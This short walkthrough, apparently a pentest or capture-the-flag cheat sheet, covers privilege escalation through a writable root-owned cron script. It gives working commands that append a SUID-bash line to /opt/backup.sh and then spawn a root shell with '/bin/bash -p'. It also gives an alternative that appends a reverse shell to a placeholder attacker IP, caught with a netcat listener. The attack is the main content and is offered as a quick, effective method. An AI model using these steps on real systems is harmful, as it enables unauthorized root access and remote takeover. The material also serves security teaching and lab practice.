Scenario: Writable /opt/backup.sh

A cron job runs /opt/backup.sh as root every minute. Your user has write permissions to this script.

1. Verify Permissions

ls -l /opt/backup.sh
# Expected output: -rwxrwxr-x 1 root youruser ... /opt/backup.sh

2. Append SUID Bash Payload

echo "chmod u+s /bin/bash" >> /opt/backup.sh

This command adds a line to the script that will make /bin/bash SUID when executed by root.

3. Gain Root Shell

/bin/bash -p
whoami
# Expected output: root

After the cron job runs, execute /bin/bash -p to get a root shell. The -p flag ensures privileges are preserved.

Alternative: Reverse Shell

Instead of SUID bash, you could append: echo "bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1" >> /opt/backup.sh. Remember to set up a Netcat listener on your attacking machine.

Why it Works

The cron job executes the script with root privileges. By appending your command, you ensure it runs with those same elevated permissions, granting you root access.

Key Takeaway

Directly modifying a writable root-owned cron script is a highly effective and quick method for privilege escalation.
